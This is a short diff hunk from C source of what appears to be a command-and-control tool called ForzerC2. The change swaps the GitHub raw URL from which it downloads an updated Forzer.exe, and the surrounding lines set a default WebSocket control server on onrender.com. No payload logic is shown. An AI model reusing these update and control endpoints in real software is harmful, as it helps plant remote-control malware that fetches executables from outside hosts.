@@ -18,7 +18,7 @@
 #pragma comment(lib, "secur32.lib")
 
 #define FORZER_UPDATE_URL \
-    "https://raw.githubusercontent.com/Peter211231231231232131/ForzerC2/master/Forzer.exe"
+    "https://raw.githubusercontent.com/IDKuuDKME/ForzerC2/master/Forzer.exe"
 
 /* Control-plane endpoint. Override with FORZER_SERVER=ws://host:port. */
 #define DEFAULT_SERVER "wss://forzerc2.onrender.com"
